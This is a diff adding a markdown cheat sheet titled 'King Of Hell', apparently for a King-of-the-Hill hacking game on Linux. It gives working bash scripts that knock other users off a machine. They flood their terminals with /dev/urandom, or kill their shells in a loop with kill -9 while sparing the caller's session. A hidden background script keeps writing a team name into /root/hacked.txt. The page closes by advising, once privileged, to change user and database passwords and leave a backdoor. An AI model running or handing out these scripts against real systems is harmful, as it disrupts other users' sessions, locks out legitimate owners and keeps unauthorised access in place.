@@ -1,0 +1,80 @@
+---
+sort: 1000
+---
+
+# King Of Hell
+
+When you run a terminal emulator (split it, create multiple ones) or connect to a remote system using SSH, a new pseudo-terminal slave device is created under the /dev/pts directory. This device acts as the interface through which the terminal emulator communicates with the shell or other processes.
+
+f**k the others connections
+```bash
+$ ps -t /dev/pts/3
+# PID   TTY      TIME     CMD
+# 33041 pts/3    00:00:00 zsh
+# 34027 pts/3    00:00:00 watch
+
+$ cat /dev/urandom > /dev/pts/3
+# OR 
+$ kill -9 `ps -t /dev/pts/3 -o pid | head -n 2 | tail -n 1`
+```
+
+Sessions Killer !! except the calling one ^^ || make it hidden file or run it on the fly !! 
+
+```bash
+#!/bin/bash
+
+while true; do
+    # Get the current terminal's device file
+    current_tty=$(tty)
+
+    # Get the current terminal's session ID
+    current_session_id=$(ps -p $$ -o sess=)
+
+    # Iterate through all /dev/pts/* devices
+    for pts in /dev/pts/*; do
+        # Skip /dev/pts/ptmx
+        if [ "$pts" = "/dev/pts/ptmx" ]; then
+            continue
+        fi
+
+        # Skip the current terminal
+        if [ "$pts" != "$current_tty" ]; then
+            # Check if the connection is not a TTY
+            if ! [ -t "$pts" ]; then
+                # Get the PID of the process using the terminal
+                pid=$(ps -t "$pts" -o pid | grep -v "PID" | head -n 1)
+
+                # Kill the process
+                if [ -n "$pid" ]; then
+                    echo "Killing PID $pid using $pts"
+                    kill -9 "$pid"
+                fi
+            fi
+        fi
+    done
+
+    sleep 1  # Wait for 1 second before the next iteration
+done
+```
+
+also in a hidden file (i.e. **.file.sh**)
+
+```bash
+#!/bin/bash
+while true; do
+    echo "TeamName" > /root/hacked.txt
+    sleep 2
+done
+```
+then 
+```bash
+$ chmod +x ./.file.sh
+$ ./.file.sh & # run it in the background
+```
+
+
+
+# When you have a privilage :
+
+* change user/SQL-DB/... passwords
+* leave a backdoor
